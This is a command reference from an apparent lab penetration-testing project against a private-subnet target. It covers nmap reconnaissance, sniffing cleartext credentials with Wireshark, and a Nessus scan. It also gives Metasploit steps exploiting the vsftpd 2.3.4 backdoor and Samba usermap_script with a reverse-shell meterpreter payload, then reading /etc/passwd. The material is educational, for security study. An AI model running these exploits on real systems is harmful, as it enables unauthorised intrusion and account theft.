# Command Reference for Network Security and Penetration Testing Project

This file lists the commands used during the reconnaissance, scanning, and exploitation phases of the project.

## 1. Kali Linux and Environment Setup

- `ifconfig` or `ip a`
  - List network interfaces and IP addresses on the Kali attacker system.
- `ping 192.168.70.136`
  - Verify connectivity to the target host.

## 2. Nmap Reconnaissance

- `nmap -sn 192.168.70.0/24`
  - Perform host discovery on the local subnet.
- `nmap -p- 192.168.70.136`
  - Scan all TCP ports on the target host.
- `nmap -sV -p 21,22,23,80,139,445,3306,5900,6667,8009 192.168.70.136`
  - Detect service versions for the commonly exposed target ports.
- `nmap -O 192.168.70.136`
  - Attempt operating system fingerprinting on the target host.
- `nmap -sV -sC -oN nmap_scan.txt 192.168.70.136`
  - Run version detection and default NSE scripts, save results to a file.

## 3. Wireshark Traffic Analysis

- Launch Wireshark and start capture on the attacker network interface.
- Use the display filter:
  - `http.request.method == "POST"`
    - Isolate HTTP form submission traffic.
- Analyze the TCP stream for the selected packet to inspect credentials sent in cleartext.

## 4. Vulnerability Scanning

- Open Nessus Essentials in a browser and log in.
- Create and run a basic network scan against `192.168.70.136`.
- Review the scan report and identify critical, high, medium, and low vulnerabilities.
- Export or capture screenshots of the Nessus results.

## 5. Metasploit Exploitation

Launch the Metasploit Framework in Kali:

- `msfconsole`

### Exploit vsftpd 2.3.4 Backdoor

- `use exploit/unix/ftp/vsftpd_234_backdoor`
- `set RHOSTS 192.168.70.136`
- `set RPORT 21`
- `exploit`

### Exploit Samba username map script vulnerability

- `use exploit/multi/samba/usermap_script`
- `set RHOSTS 192.168.70.136`
- `set RPORT 139`
- `set LHOST 192.168.70.135`
- `set payload linux/x86/meterpreter/reverse_tcp`
- `exploit`

### Post-Exploitation Validation

- `sysinfo`
  - Verify the compromised system information.
- `id`
  - Confirm the current user identity and privileges.
- `cat /etc/passwd`
  - Enumerate local user accounts on the compromised host.

## 6. Additional Useful Commands

- `netstat -tuln`
  - View listening services on the local machine.
- `ss -tulnp`
  - List open sockets and associated processes.
- `nmap --script vuln -p 21,139,445 192.168.70.136`
  - Run Nmap vulnerability scripts against selected ports.
- `searchsploit vsftpd 2.3.4`
  - Search local Exploit-DB entries for the vsftpd backdoor.
- `searchsploit samba usermap_script`
  - Search local Exploit-DB entries for the Samba usermap script vulnerability.

## 7. Notes

- Some steps are performed using graphical tools such as Wireshark and Nessus. The command list focuses on the terminal and CLI commands used to support the project workflow.
- Always perform penetration testing only on authorized systems and networks.
